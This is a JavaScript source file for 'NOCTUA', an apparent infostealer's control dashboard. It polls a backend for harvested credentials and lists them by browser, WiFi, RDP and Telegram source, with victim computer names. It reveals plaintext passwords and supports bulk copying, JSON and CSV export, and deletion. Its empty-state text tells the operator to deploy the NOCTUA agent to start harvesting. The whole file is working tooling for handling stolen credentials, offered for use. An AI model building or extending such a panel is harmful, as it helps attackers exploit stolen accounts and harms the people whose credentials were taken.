/* ===================================================================
   NOCTUA Dashboard - Main Application JavaScript
   Auto-polling, search/filter, copy, export, toast notifications
   =================================================================== */

(function() {
    'use strict';

    // -------------------------------------------------------------------
    // State
    // -------------------------------------------------------------------
    const State = {
        data: [],
        filtered: [],
        total: 0,
        stats: null,
        sortBy: 'timestamp',
        sortOrder: 'DESC',
        searchTerm: '',
        filterTarget: '',
        filterCategory: '',
        isLoading: false,
        pollInterval: 3000,
        pollTimer: null,
        confirmCallback: null,
        confirmContext: null
    };

    // -------------------------------------------------------------------
    // DOM References
    // -------------------------------------------------------------------
    const DOM = {};

    function initDOM() {
        DOM.tableBody = document.getElementById('tableBody');
        DOM.searchInput = document.getElementById('searchInput');
        DOM.filterTarget = document.getElementById('filterTarget');
        DOM.filterCategory = document.getElementById('filterCategory');
        DOM.badgeCount = document.getElementById('badgeCount');
        DOM.resultCount = document.getElementById('resultCount');
        DOM.loadingOverlay = document.getElementById('loadingOverlay');
        DOM.connectionStatus = document.getElementById('connectionStatus');
        DOM.toastContainer = document.getElementById('toastContainer');
        DOM.confirmModal = document.getElementById('confirmModal');
        DOM.confirmMessage = document.getElementById('confirmMessage');
        DOM.confirmBtn = document.getElementById('confirmBtn');
        DOM.pollStatus = document.getElementById('pollStatus');
        
        // Stats elements
        DOM.statTotal = document.getElementById('statTotal');
        DOM.statBrowser = document.getElementById('statBrowser');
        DOM.statWifi = document.getElementById('statWifi');
        DOM.statRdp = document.getElementById('statRdp');
        DOM.statTelegram = document.getElementById('statTelegram');
        DOM.statComputers = document.getElementById('statComputers');
        
        // Sortable headers
        document.querySelectorAll('th.sortable').forEach(th => {
            th.addEventListener('click', () => {
                const sort = th.dataset.sort;
                if (State.sortBy === sort) {
                    State.sortOrder = State.sortOrder === 'ASC' ? 'DESC' : 'ASC';
                } else {
                    State.sortBy = sort;
                    State.sortOrder = 'DESC';
                }
                
                // Update header indicators
                document.querySelectorAll('th.sortable').forEach(h => {
                    h.classList.remove('sort-asc', 'sort-desc');
                });
                th.classList.add(State.sortOrder === 'ASC' ? 'sort-asc' : 'sort-desc');
                
                renderTable();
            });
        });
    }

    // -------------------------------------------------------------------
    // API Calls
    // -------------------------------------------------------------------
    async function apiGet(path) {
        try {
            const resp = await fetch(path, {
                headers: { 'Accept': 'application/json' }
            });
            return await resp.json();
        } catch (err) {
            throw new Error(`API GET ${path} failed: ${err.message}`);
        }
    }

    async function apiPost(path, data) {
        try {
            const resp = await fetch(path, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                },
                body: JSON.stringify(data)
            });
            return await resp.json();
        } catch (err) {
            throw new Error(`API POST ${path} failed: ${err.message}`);
        }
    }

    async function apiDelete(path, data) {
        try {
            const resp = await fetch(path, {
                method: 'DELETE',
                headers: {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                },
                body: JSON.stringify(data)
            });
            return await resp.json();
        } catch (err) {
            throw new Error(`API DELETE ${path} failed: ${err.message}`);
        }
    }

    // -------------------------------------------------------------------
    // Data Loading
    // -------------------------------------------------------------------
    async function loadData() {
        if (State.isLoading) return;
        State.isLoading = true;
        DOM.loadingOverlay.classList.add('active');
        
        try {
            const params = new URLSearchParams();
            if (State.searchTerm) params.set('search', State.searchTerm);
            if (State.filterTarget) params.set('target', State.filterTarget);
            if (State.filterCategory) params.set('category', State.filterCategory);
            params.set('sort_by', State.sortBy);
            params.set('sort_order', State.sortOrder);
            params.set('limit', '5000');
            
            const result = await apiGet(`/api/data?${params.toString()}`);
            
            if (result.success) {
                State.data = result.data.credentials || [];
                State.total = result.data.total || 0;
                State.stats = result.data.stats;
                updateUI();
                setConnected(true);
            } else {
                showToast('Error loading data: ' + (result.error || 'Unknown error'), 'error');
                setConnected(false);
            }
        } catch (err) {
            showToast('Connection error: ' + err.message, 'error');
            setConnected(false);
        } finally {
            State.isLoading = false;
            DOM.loadingOverlay.classList.remove('active');
        }
    }

    // -------------------------------------------------------------------
    // UI Updates
    // -------------------------------------------------------------------
    function updateUI() {
        updateStats();
        renderTable();
    }

    function updateStats() {
        const stats = State.stats;
        if (!stats) return;
        
        DOM.statTotal.textContent = stats.total || 0;
        DOM.statBrowser.textContent = (stats.categories && stats.categories.browser) || 0;
        DOM.statWifi.textContent = (stats.categories && stats.categories.wifi) || 0;
        DOM.statRdp.textContent = (stats.categories && stats.categories.rdp) || 0;
        DOM.statTelegram.textContent = (stats.categories && stats.categories.telegram) || 0;
        DOM.statComputers.textContent = (stats.computers && stats.computers.length) || 0;
        DOM.badgeCount.textContent = stats.total || 0;
    }

    function renderTable() {
        const data = State.data;
        DOM.resultCount.textContent = `${data.length} results`;
        
        if (data.length === 0) {
            DOM.tableBody.innerHTML = `
                <tr class="empty-row">
                    <td colspan="8">
                        <div class="empty-state">
                            <span class="empty-icon">🦉</span>
                            <p>No credentials found</p>
                            <p class="empty-sub">${State.searchTerm ? 'Try a different search term' : 'Deploy the NOCTUA agent to start harvesting'}</p>
                        </div>
                    </td>
                </tr>
            `;
            return;
        }
        
        let html = '';
        for (const cred of data) {
            const targetClass = getTargetClass(cred.target);
            const passwordId = `pw-${cred.id}`;
            const passwordShort = maskPassword(cred.password);
            
            html += `<tr>
                <td>
                    <span class="target-badge ${targetClass}">${escapeHtml(cred.target)}</span>
                </td>
                <td title="${escapeHtml(cred.username)}">
                    <span class="click-copy" onclick="copyToClipboard('${escapeJs(cred.username)}')">${escapeHtml(truncate(cred.username, 30))}</span>
                </td>
                <td class="password-cell" onclick="togglePassword(${cred.id})">
                    <span id="${passwordId}-mask" class="password-masked">${passwordShort}</span>
                    <span id="${passwordId}" class="password-revealed" style="display:none">${escapeHtml(cred.password)}</span>
                    <span class="copy-hint">📋</span>
                </td>
                <td title="${escapeHtml(cred.url)}">${escapeHtml(truncate(cred.url, 40))}</td>
                <td title="${escapeHtml(cred.notes)}">${escapeHtml(truncate(cred.notes, 30))}</td>
                <td>${escapeHtml(cred.computer_name || '-')}</td>
                <td title="${cred.timestamp}">${formatTime(cred.timestamp)}</td>
                <td>
                    <button class="btn-icon-only" onclick="copyCred(${cred.id})" title="Copy credential">📋</button>
                    <button class="btn-icon-only danger" onclick="deleteCred(${cred.id})" title="Delete">🗑️</button>
                </td>
            </tr>`;
        }
        
        DOM.tableBody.innerHTML = html;
        
        // Close password reveals when clicking elsewhere
        document.addEventListener('click', function closePasswords(e) {
            if (!e.target.closest('.password-cell')) {
                document.querySelectorAll('.password-revealed').forEach(el => {
                    el.style.display = 'none';
                });
                document.querySelectorAll('.password-masked').forEach(el => {
                    el.style.display = '';
                });
            }
        }, { once: false });
    }

    // -------------------------------------------------------------------
    // Helpers
    // -------------------------------------------------------------------
    function getTargetClass(target) {
        const t = (target || '').toLowerCase();
        if (t.includes('chrome') || t.includes('edge') || t.includes('brave') ||
            t.includes('opera') || t.includes('vivaldi') || t.includes('cookie'))
            return 'browser';
        if (t.includes('wifi')) return 'wifi';
        if (t.includes('rdp')) return 'rdp';
        if (t.includes('telegram')) return 'telegram';
        return 'other';
    }

    function maskPassword(pw) {
        if (!pw) return '-';
        if (pw.length <= 8) return '•'.repeat(pw.length);
        return pw.substring(0, 2) + '•'.repeat(Math.min(pw.length - 4, 16)) + pw.substring(pw.length - 2);
    }

    function truncate(str, len) {
        if (!str) return '';
        if (str.length <= len) return str;
        return str.substring(0, len) + '…';
    }

    function escapeHtml(str) {
        if (!str) return '';
        const div = document.createElement('div');
        div.textContent = str;
        return div.innerHTML;
    }

    function escapeJs(str) {
        if (!str) return '';
        return str.replace(/\\/g, '\\\\')
                  .replace(/'/g, "\\'")
                  .replace(/"/g, '\\"')
                  .replace(/\n/g, '\\n')
                  .replace(/\r/g, '\\r');
    }

    function formatTime(ts) {
        if (!ts) return '-';
        try {
            const d = new Date(ts + 'Z');
            if (isNaN(d.getTime())) return ts;
            const now = new Date();
            const diff = (now - d) / 1000;
            
            if (diff < 60) return 'just now';
            if (diff < 3600) return `${Math.floor(diff / 60)}m ago`;
            if (diff < 86400) return `${Math.floor(diff / 3600)}h ago`;
            if (diff < 604800) return `${Math.floor(diff / 86400)}d ago`;
            
            return d.toLocaleDateString('en-US', {
                month: 'short', day: 'numeric',
                hour: '2-digit', minute: '2-digit'
            });
        } catch (e) {
            return ts;
        }
    }

    function setConnected(connected) {
        const el = DOM.connectionStatus;
        if (connected) {
            el.classList.remove('disconnected');
            el.querySelector('.status-text').textContent = 'Connected';
        } else {
            el.classList.add('disconnected');
            el.querySelector('.status-text').textContent = 'Disconnected';
        }
    }

    // -------------------------------------------------------------------
    // Toast Notifications
    // -------------------------------------------------------------------
    window.showToast = function(message, type = 'info', duration = 3000) {
        const icons = {
            success: '✅',
            error: '❌',
            info: 'ℹ️'
        };
        
        const toast = document.createElement('div');
        toast.className = `toast ${type}`;
        toast.innerHTML = `<span>${icons[type] || 'ℹ️'}</span><span>${escapeHtml(message)}</span>`;
        
        DOM.toastContainer.appendChild(toast);
        
        setTimeout(() => {
            toast.classList.add('toast-exit');
            setTimeout(() => toast.remove(), 300);
        }, duration);
    };

    // -------------------------------------------------------------------
    // Clipboard
    // -------------------------------------------------------------------
    window.copyToClipboard = async function(text) {
        if (!text) {
            showToast('Nothing to copy', 'error');
            return;
        }
        try {
            if (navigator.clipboard && navigator.clipboard.writeText) {
                await navigator.clipboard.writeText(text);
            } else {
                // Fallback
                const ta = document.createElement('textarea');
                ta.value = text;
                ta.style.position = 'fixed';
                ta.style.opacity = '0';
                document.body.appendChild(ta);
                ta.select();
                document.execCommand('copy');
                ta.remove();
            }
            showToast('Copied to clipboard', 'success');
        } catch (err) {
            showToast('Copy failed: ' + err.message, 'error');
        }
    };

    window.copyCred = async function(id) {
        const cred = State.data.find(c => c.id === id);
        if (!cred) return;
        const text = `Target: ${cred.target}\nUsername: ${cred.username}\nPassword: ${cred.password}\nURL: ${cred.url}\nComputer: ${cred.computer_name}`;
        await window.copyToClipboard(text);
    };

    window.togglePassword = function(id) {
        const maskEl = document.getElementById(`pw-${id}-mask`);
        const revealEl = document.getElementById(`pw-${id}`);
        if (!maskEl || !revealEl) return;
        
        if (revealEl.style.display === 'none') {
            maskEl.style.display = 'none';
            revealEl.style.display = '';
        } else {
            maskEl.style.display = '';
            revealEl.style.display = 'none';
        }
    };

    window.copyAllVisible = async function() {
        const data = State.data;
        if (data.length === 0) {
            showToast('No credentials to copy', 'error');
            return;
        }
        
        let text = `NOCTUA Export - ${new Date().toISOString()}\n`;
        text += `${'='.repeat(60)}\n\n`;
        
        for (const cred of data) {
            text += `Target:    ${cred.target}\n`;
            text += `Username:  ${cred.username}\n`;
            text += `Password:  ${cred.password}\n`;
            text += `URL:       ${cred.url}\n`;
            text += `Computer:  ${cred.computer_name}\n`;
            text += `Time:      ${cred.timestamp}\n`;
            text += `${'-'.repeat(40)}\n`;
        }
        
        await window.copyToClipboard(text);
    };

    // -------------------------------------------------------------------
    // Search & Filter
    // -------------------------------------------------------------------
    window.onSearch = function() {
        State.searchTerm = DOM.searchInput.value.trim();
        State.filterTarget = DOM.filterTarget.value;
        State.filterCategory = DOM.filterCategory.value;
        loadData();
    };

    window.onFilterChange = function() {
        State.filterTarget = DOM.filterTarget.value;
        State.filterCategory = DOM.filterCategory.value;
        loadData();
    };

    // -------------------------------------------------------------------
    // Export
    // -------------------------------------------------------------------
    window.exportJSON = function() {
        const params = new URLSearchParams();
        if (State.searchTerm) params.set('search', State.searchTerm);
        if (State.filterTarget) params.set('target', State.filterTarget);
        window.open(`/api/export/json?${params.toString()}`, '_blank');
        showToast('Exporting JSON...', 'info');
    };

    window.exportCSV = function() {
        const params = new URLSearchParams();
        if (State.searchTerm) params.set('search', State.searchTerm);
        if (State.filterTarget) params.set('target', State.filterTarget);
        window.open(`/api/export/csv?${params.toString()}`, '_blank');
        showToast('Exporting CSV...', 'info');
    };

    // -------------------------------------------------------------------
    // Delete Operations
    // -------------------------------------------------------------------
    window.deleteCred = function(id) {
        showConfirm(
            'Delete this credential?',
            `Are you sure you want to delete credential #${id}?`,
            async () => {
                try {
                    const result = await apiDelete('/api/data', {
                        mode: 'id',
                        ids: [id]
                    });
                    if (result.success) {
                        showToast(`Deleted credential #${id}`, 'success');
                        loadData();
                    } else {
                        showToast('Delete failed: ' + (result.error || 'Unknown'), 'error');
                    }
                } catch (err) {
                    showToast('Delete error: ' + err.message, 'error');
                }
            }
        );
    };

    window.deleteVisible = function() {
        const data = State.data;
        if (data.length === 0) {
            showToast('No credentials to delete', 'error');
            return;
        }
        
        showConfirm(
            'Delete all visible credentials?',
            `This will delete ${data.length} credential(s). This cannot be undone.`,
            async () => {
                try {
                    // Delete all visible by their IDs
                    const ids = data.map(c => c.id);
                    const result = await apiDelete('/api/data', {
                        mode: 'id',
                        ids: ids
                    });
                    if (result.success) {
                        showToast(`Deleted ${result.deleted} credential(s)`, 'success');
                        loadData();
                    } else {
                        showToast('Delete failed: ' + (result.error || 'Unknown'), 'error');
                    }
                } catch (err) {
                    showToast('Delete error: ' + err.message, 'error');
                }
            }
        );
    };

    window.clearAll = function() {
        showConfirm(
            '🗑️ Clear ALL credentials?',
            'This will permanently delete ALL stored credentials and collection records. This action cannot be undone!',
            async () => {
                try {
                    const result = await apiDelete('/api/data', { mode: 'all' });
                    if (result.success) {
                        showToast(`Cleared ${result.deleted} credential(s)`, 'success');
                        loadData();
                    } else {
                        showToast('Clear failed: ' + (result.error || 'Unknown'), 'error');
                    }
                } catch (err) {
                    showToast('Clear error: ' + err.message, 'error');
                }
            }
        );
    };

    // -------------------------------------------------------------------
    // Confirmation Modal
    // -------------------------------------------------------------------
    function showConfirm(title, message, callback) {
        DOM.confirmMessage.textContent = message;
        DOM.confirmModal.querySelector('h3').textContent = title;
        DOM.confirmModal.classList.add('active');
        State.confirmCallback = callback;
    }

    window.closeModal = function() {
        DOM.confirmModal.classList.remove('active');
        State.confirmCallback = null;
    };

    window.executeConfirm = function() {
        DOM.confirmModal.classList.remove('active');
        if (State.confirmCallback) {
            State.confirmCallback();
            State.confirmCallback = null;
        }
    };

    // -------------------------------------------------------------------
    // Refresh
    // -------------------------------------------------------------------
    window.refreshData = function() {
        showToast('Refreshing data...', 'info');
        loadData();
    };

    // -------------------------------------------------------------------
    // Polling
    // -------------------------------------------------------------------
    function startPolling() {
        if (State.pollTimer) clearInterval(State.pollTimer);
        State.pollTimer = setInterval(() => {
            loadData();
        }, State.pollInterval);
        DOM.pollStatus.textContent = `Auto-polling ${State.pollInterval/1000}s`;
    }

    // -------------------------------------------------------------------
    // Initialize
    // -------------------------------------------------------------------
    function init() {
        initDOM();
        loadData().then(() => {
            startPolling();
        });
        
        // Add keyboard shortcut: Ctrl+R to refresh
        document.addEventListener('keydown', (e) => {
            if ((e.ctrlKey || e.metaKey) && e.key === 'r') {
                e.preventDefault();
                refreshData();
            }
        });
    }

    // Wait for DOM to be ready
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }

})();
